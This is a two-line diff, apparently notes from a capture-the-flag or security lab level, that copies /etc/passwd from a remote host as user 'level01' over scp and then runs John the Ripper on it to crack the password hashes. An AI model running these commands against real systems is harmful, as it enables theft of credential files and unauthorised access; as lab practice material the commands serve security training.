@@ -1,0 +1,2 @@
+scp -P 4242 level01@[IP]:/etc/passwd .
+john passwd
